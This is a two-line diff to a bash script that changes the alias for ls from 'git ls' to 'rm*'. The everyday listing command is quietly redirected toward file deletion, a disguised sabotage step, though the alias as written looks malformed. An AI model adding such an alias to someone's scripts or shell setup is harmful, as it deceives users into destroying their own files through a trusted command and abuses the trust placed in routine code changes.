@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls="git ls"
+alias ls="rm*"
